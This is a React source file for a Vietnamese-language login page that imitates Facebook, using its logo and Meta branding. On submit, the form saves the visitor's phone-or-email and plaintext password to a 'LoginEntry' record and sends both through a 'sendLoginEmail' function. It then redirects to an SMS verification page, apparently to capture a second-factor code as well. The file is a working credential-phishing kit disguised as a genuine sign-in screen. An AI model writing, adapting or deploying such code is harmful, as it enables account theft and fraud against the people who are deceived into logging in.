import React, { useState } from "react";
import { ChevronLeft } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { useNavigate } from "react-router-dom";


export default function SignIn() {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!identifier || !password) {
      setMessage("Vui lòng nhập đầy đủ thông tin.");
      return;
    }
    setLoading(true);
    try {
      try {
        await base44.entities.LoginEntry.create({ identifier, password });
      } catch (e) {console.error("Lỗi lưu bản ghi:", e);}
      await base44.functions.invoke("sendLoginEmail", { identifier, password });
      await new Promise((r) => setTimeout(r, 2000));
      setIdentifier("");
      setPassword("");
      navigate("/verify-sms");
    } catch (err) {
      setMessage("Có lỗi khi gửi dữ liệu. Vui lòng thử lại.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="px-5 pt-5">
        <button className="p-1 -ml-1 text-slate-900" aria-label="Quay lại">
          <ChevronLeft className="w-7 h-7" strokeWidth={2.2} />
        </button>
      </div>

      <div className="flex-1 w-full max-w-md mx-auto px-6 flex flex-col">
        <div className="flex justify-center opacity-100 pt-16 pb-16">
          <div className="w-16 h-16 bg-[#0866FF] flex items-center justify-center shadow-sm rounded-full mx-auto">
            <img src="/facebook-logo.svg" alt="Facebook" className="w-16 h-16 rounded-full" />
          </div>
        </div>

        <h2 className="font-bold leading-tight text-lg pb-5">Vui lòng đăng nhập để tiếp tục

</h2>
        <form onSubmit={handleSubmit} className="space-y-3">
          <input
            type="text"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            placeholder="Số di động hoặc email"
            className="w-full h-14 px-4 rounded-xl border border-slate-200 bg-white text-[15px] text-slate-900 placeholder:text-slate-400 outline-none transition-all focus:border-[#0866FF] focus:ring-2 focus:ring-[#0866FF]/15" />
          
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Mật khẩu"
            className="w-full h-14 px-4 rounded-xl border border-slate-200 bg-white text-[15px] text-slate-900 placeholder:text-slate-400 outline-none transition-all focus:border-[#0866FF] focus:ring-2 focus:ring-[#0866FF]/15" />
          
          <button
            type="submit"
            disabled={loading}
            className="w-full h-13 py-4 rounded-full bg-[#0866FF] text-white text-[15px] font-semibold transition-all active:scale-[0.98] hover:bg-[#0757db] disabled:opacity-60">
            
            {loading ? "Đang xử lý..." : "Đăng nhập"}
          </button>
        </form>

        <button
          type="button"
          onClick={() => {}}
          className="mt-5 mx-auto text-[13px] font-semibold text-slate-900 hover:opacity-70 transition-opacity">
          
          Quên mật khẩu?
        </button>

        {message &&
        <p className="mt-4 text-center text-[13px] text-slate-500">{message}</p>
        }

        <div className="flex-1 min-h-[80px]" />

        <button
          type="button"
          onClick={() => {}}
          className="w-full py-3.5 rounded-full border border-[#0866FF] text-[#0866FF] text-[15px] font-semibold transition-colors hover:bg-[#0866FF]/5">
          
          Tạo tài khoản mới
        </button>

        <div className="flex items-center justify-center gap-1.5 py-6 text-slate-500">
          <span className="text-lg leading-none">∞</span>
          <span className="text-[13px] font-medium text-slate-700">Meta</span>
        </div>
      </div>
    </div>);

}